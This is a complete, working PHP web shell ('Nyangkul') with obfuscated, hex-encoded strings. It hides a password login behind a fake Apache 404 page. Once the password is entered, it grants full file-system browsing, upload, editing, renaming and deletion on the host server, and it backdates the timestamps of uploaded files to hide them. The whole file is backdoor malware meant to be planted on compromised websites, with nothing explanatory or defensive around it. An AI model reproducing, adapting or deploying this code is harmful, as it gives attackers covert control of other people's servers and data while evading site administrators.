<?php
if (!is_writable(session_save_path())) { @mkdir("\56\163\x65\163\163\x69\157\x6e", 511); session_save_path("\x2e\163\x65\163\163\x69\x6f\156"); } session_start(); function generateRandomStringx($length = 10) { $characters = "\x30\61\62\63\64\65\x36\67\70\x39\141\x62\143\144\145\x66\147\x68\151\x6a\153\154\155\156\x6f\x70\x71\x72\x73\164\x75\166\x77\x78\x79\x7a\101\x42\x43\x44\105\x46\x47\110\111\x4a\113\x4c\115\116\117\x50\121\x52\x53\124\125\x56\127\x58\x59\x5a"; $charactersLength = 62; $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } function License() { echo "\74\41\x44\x4f\x43\x54\131\x50\105\x20\150\x74\155\154\76\x3c\x68\x74\x6d\x6c\76\x3c\150\145\x61\144\76\x3c\x6d\145\164\x61\40\156\x61\x6d\145\75\x27\x72\x6f\142\x6f\164\x73\x27\40\x63\157\x6e\x74\145\x6e\x74\x27\156\157\151\x6e\x64\145\x78\54\x20\x6e\x6f\x66\157\154\154\x6f\x77\x27\x3e\74\x74\x69\164\x6c\145\x3e\74\57\164\151\164\x6c\x65\x3e\74\x2f\x68\145\x61\144\76\74\142\157\x64\x79\76\x3c\150\x31\x3e\x4e\x6f\164\x20\106\157\165\156\144\x3c\x2f\150\61\76\x3c\x74\x69\x74\154\145\x3e\64\x30\64\x20\116\157\164\40\x46\157\165\156\x64\74\57\x74\x69\164\x6c\145\76\74\x73\164\171\154\145\x20\x74\171\160\145\75\x27\164\145\x78\164\x2f\x63\x73\x73\x27\x3e\x69\156\160\x75\x74\133\x74\x79\160\145\75\x70\141\x73\x73\167\157\x72\x64\135\x20\x7b\x20\x77\x69\x64\164\x68\x3a\40\x32\x35\x30\x70\170\73\x20\150\x65\x69\x67\150\164\72\x20\x32\65\x70\x78\73\40\143\x6f\x6c\x6f\162\72\40\x77\x68\151\164\x65\x3b\x20\142\141\143\153\x67\x72\x6f\x75\x6e\x64\72\40\164\162\x61\156\x73\160\141\x72\145\156\164\73\x20\x62\157\162\144\x65\x72\x3a\x20\61\160\170\x20\x73\157\x6c\151\x64\40\167\150\x69\x74\145\73\x20\x6d\141\162\x67\151\156\55\154\145\x66\164\x3a\x20\62\60\160\170\73\40\164\145\170\x74\x2d\141\154\x69\x67\x6e\x3a\x20\143\145\156\164\x65\162\x3b\40\x7d\74\57\x73\x74\171\x6c\x65\76\74\160\x3e\x54\150\x65\x20\162\x65\x71\x75\145\x73\164\145\144\x20\x55\122\114\x20\x77\x61\163\40\156\x6f\164\x20\146\x6f\x75\x6e\x64\x20\157\x6e\x20\164\x68\x69\163\x20\x73\145\162\x76\145\162\x2e\74\x2f\x70\76\x3c\160\x3e\x41\144\144\151\164\x69\157\x6e\141\x6c\x6c\x79\54\x20\x61\x20\64\60\64\40\116\x6f\164\40\x46\x6f\x75\x6e\x64\40\x65\x72\162\x6f\x72\40\x77\x61\163\40\x65\156\143\157\165\156\x74\x65\162\145\144\x20\x77\150\151\x6c\x65\40\x74\162\171\151\x6e\x67\40\x74\157\x20\x75\163\x65\40\141\x6e\40\x45\162\162\157\x72\x44\x6f\143\x75\x6d\x65\156\x74\40\164\157\x20\x68\141\x6e\144\x6c\x65\40\x74\x68\x65\x20\x72\x65\x71\x75\x65\x73\164\56\x3c\57\160\x3e\x3c\x68\x72\76\x3c\x61\x64\144\162\145\163\163\76\101\x70\x61\143\150\x65\40\x53\x65\x72\166\x65\162\40\x61\x74\x20" . $_SERVER["\110\124\124\x50\x5f\x48\x4f\123\124"] . "\x20\x50\x6f\x72\x74\x20" . $_SERVER["\x53\105\x52\x56\x45\x52\x5f\120\x4f\x52\124"] . "\x3c\57\x61\144\144\162\x65\163\x73\76\x3c\x63\145\156\x74\x65\x72\x3e\x3c\x66\157\162\155\40\155\145\164\150\x6f\144\x3d\47\x70\x6f\x73\x74\x27\x3e\74\x69\x6e\160\x75\x74\x20\164\171\x70\145\75\x27\160\141\163\163\167\x6f\x72\144\x27\40\156\141\155\x65\75\x27" . $_SESSION["\x6b\145\171\170\x78"] . "\47\x20\x61\165\x74\157\143\x6f\x6d\160\x6c\145\x74\x65\75\47\157\146\146\x27\76\x3c\x62\162\x3e\74\57\146\157\162\155\76\x3c\x2f\143\145\x6e\164\x65\x72\x3e\74\57\x62\x6f\144\x79\76\x3c\57\150\x74\155\x6c\x3e"; die; } $auth_pass5 = "\x65\x39\x34\x38\x64\x61\x62\x64\x35\x65\x36\x37\x38\x37\x37\x34\x32\x62\x62\x36\x39\x38\x32\x38\x33\x31\x31\x64\x65\x34\x34\x63\x37\x64\x35\x36\x30\x35\x35\x37"; if (empty($_SESSION["\x6b\x65\171\170\x78"])) { $keyxxx = generateRandomStringx(); $_SESSION["\x6b\x65\x79\x78\x78"] = $keyxxx; } $keyxx = $_SESSION["\153\x65\171\x78\x78"]; if (empty($_SESSION[sha1(md5($_SERVER["\x48\124\124\120\137\x48\117\x53\x54"])) . $keyxx])) { if (isset($_POST[$keyxx]) and sha1(md5($_POST[$keyxx])) == $auth_pass5) { $_SESSION[sha1(md5($_SERVER["\110\x54\x54\120\137\110\x4f\x53\x54"])) . $keyxx] = true; } else { License(); die; } } 
$sname       = "Nyangkul";
$__gcdir     = "\x67" . "\x65\x74\x63\x77\x64";
$__fgetcon7s = "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
$__scdir     = "s" . "\x63\x61\x6e\x64\x69" . "r";
$rm__dir     = "\x72\x6d\x64" . "ir";
$un__link    = "\x75\x6e" . "\x6c\x69\x6e\x6b";

if (get_magic_quotes_gpc()) {
    foreach ($_POST as $key => $value) {
        $_POST[$key] = stripslashes($value);
    }
}

echo '<!DOCTYPE html><html><head><meta name="robots" content"noindex. nofollow"><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet"><title>'.$sname.'</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><link href="//zerobyte-id.github.io/PHP-Backdoor/inc/m1n1.css" rel="stylesheet" type="text/css"></head><body>';

echo '<div style="color:#ef6c00;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
    $path = $__gcdir();
}
$path  = str_replace("\\", "/", $path);
$paths = explode("/", $path);
echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';
echo "<font style='font-size:13px;'>Path: ";
foreach ($paths as $id => $pat) {
    echo "<a style='font-size:13px;' href='?path=";
    for ($i = 0; $i <= $id; $i++) {
        echo $paths[$i];
        if ($i != $id) {
            echo "/";
        }
    }
    echo "'>$pat</a>/";
}
echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#ef6c00;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
if (isset($_FILES['file'])) {
    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
        echo '<center><font color="#00ff00">Upload OK!</font></center><br/>';
        @touch($path . '/' . $_FILES['file']['name'],strtotime("-".rand(60,360)." days", time()));
    } else {
        echo '<center><font color="red">Upload FAILED!</font></center><br/>';
    }
}
echo '</td></tr><tr><td></table><div class="table-div"></div><input id="image" type="hidden">';
echo '';
if (isset($_GET['filesrc'])) {
    echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';
    echo "" . basename($_GET['filesrc']);
    "";
    echo '</tr></td></table><br />';
    echo ("<center><textarea readonly=''>" . htmlspecialchars($__fgetcon7s($_GET['filesrc'])) . "</textarea></center>");
} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
    if ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<center><font color="#00ff00">Rename OK!</font></center><br />';
            } else {
                echo '<center><font color="red">Rename Failed!</font></center><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" /> <input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
    } elseif ($_POST['opt'] == 'edit') {
        if (isset($_POST['src'])) {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src'])) {
                echo '<center><font color="#00ff00">Edit File OK!.</font></center><br />';
            } else {
                echo '<center><font color="red">Edit File Failed!.</font></center><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST"><textarea cols=80 rows=20 name="src">' . htmlspecialchars($__fgetcon7s($_POST['path'])) . '</textarea><br /><input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';
    }
    echo '</center>';
} else {
    echo '</table><br /><center>';
    if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if ($rm__dir($_POST['path'])) {
                echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
            } else {
                echo '<center><font color="red">Delete Dir Failed!</font></center><br />';
            }
        } elseif ($_POST['type'] == 'file') {
            if ($un__link($_POST['path'])) {
                echo '<font color="#00ff00">Delete File Done.</font><br />';
            } else {
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $_scdir = $__scdir($path);
    echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"> <th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th> <th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
    foreach ($_scdir as $dir) {
        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
            continue;
        echo "<tr><td>[D] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
        if (is_writable("$path/$dir"))
            echo '<font color="#00ff00">';
        elseif (!is_readable("$path/$dir"))
            echo '<font color="red">';
        echo perms("$path/$dir");
        if (is_writable("$path/$dir") || !is_readable("$path/$dir"))
            echo '</font>';
        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "";
        echo "</center></td> <td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
    }
    foreach ($_scdir as $file) {
        if (!is_file("$path/$file"))
            continue;
        $size = filesize("$path/$file") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }
        echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>";
        if (is_writable("$path/$file"))
            echo '<font color="#00ff00">';
        elseif (!is_readable("$path/$file"))
            echo '<font color="red">';
        echo perms("$path/$file");
        if (is_writable("$path/$file") || !is_readable("$path/$file"))
            echo '</font>';
        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$file")) . "";
        echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
    }
    echo '</table></div>';
}
function perms($file)
{
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
echo '<br><center>&copy; <span id="footer"></span> .eOF</center><br>';
echo '</body></html><!-- EOF -->';
?>